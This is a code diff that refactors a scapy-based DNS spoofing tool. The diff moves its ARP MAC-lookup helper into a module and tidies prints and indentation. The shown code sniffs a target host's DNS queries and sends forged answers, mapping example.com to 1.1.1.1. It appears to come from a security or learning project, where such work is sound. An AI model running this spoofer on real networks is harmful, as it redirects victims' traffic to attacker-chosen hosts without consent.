@@ -1,15 +1,17 @@
 #!/usr/bin/env python3
 
-from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send, sendp, Ether, ARP, srp, get_if_hwaddr, get_if_addr, conf
+from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, sendp, Ether, get_if_hwaddr, get_if_addr
 import sys
 import os
 import time
+from modules.helpers import get_mac
 
 class DNSSpoofer:
     def __init__(self, interface, target_ip, gateway_ip):
         self.interface = interface
         self.target_ip = target_ip
         self.gateway_ip = gateway_ip
+
         self.dns_records = {
             "example.com": "1.1.1.1"
         }
@@ -19,23 +21,9 @@ class DNSSpoofer:
 
         self.spoofing = False
 
-    def get_mac(self, ip):
-        '''
-        Get the MAC address of the target or gateway
-        '''
-        arp_request = ARP(pdst=ip)
-        broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-        arp_request_broadcast = broadcast/arp_request
-        try:
-            answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-            return answered_list[0][1].hwsrc
-        except IndexError:
-            pass
-
     def handle_dns_request(self, pkt):
         # Extract domain name from DNSQR
         domain = pkt[DNSQR].qname.decode('utf-8').rstrip('.')
-        print(domain)
 
         if domain in self.dns_records:
             # Check if we have a spoofed record for this domain
@@ -61,12 +49,11 @@ class DNSSpoofer:
         self.spoofing = True
         print(f"[*] Starting DNS spoofing...")
         print(f"[*] Target: {self.target_ip}")
-        print(f"[*] Gateway: {self.gateway_ip}")
         print(f"[*] Spoofed DNS records: {self.dns_records}")
 
         try:
             while self.spoofing:
-            # Sniff for DNS requests with a timeout to make it non-blocking
+                # Sniff for DNS requests with a timeout to make it non-blocking
                 sniff(filter=f"udp port 53 and host {self.target_ip}",
                     prn=self.handle_dns_request,
                     store=0,
